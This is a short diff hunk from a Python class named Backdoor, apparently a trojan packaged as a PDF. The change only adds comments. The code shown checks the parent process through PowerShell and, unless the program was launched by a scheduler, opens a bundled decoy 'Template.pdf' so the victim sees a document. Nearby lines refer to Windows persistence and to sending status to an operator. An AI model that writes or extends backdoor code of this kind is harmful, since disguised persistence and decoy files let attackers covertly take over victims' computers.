@@ -28,12 +28,18 @@ class Backdoor:
             self.reliable_send("[-] Non-Windows OS detected\n[-] Unable to establish persistence")
             return
 
+        # The code below checks to see if the executable is being run by Windows on Startup or by a USER
+        # Get PARENT process ID
         parent_PID = os.getppid()
+        # Get process details of the PARENT PROCESS
         cmd = 'powershell -c "Get-Process | findstr "'+str(parent_PID)
         parent_process_details = str(self.exec_system_cmd(cmd).decode('utf-8'))
+        # Check if the parent == name(file) in %APPDATA% 
+        # If true it is indicative of the executable being the system itself
         if "scheduler" not in parent_process_details:
             file_name = sys._MEIPASS + "\Template.pdf"
             subprocess.call(file_name, shell = True)
+        
 
 
 
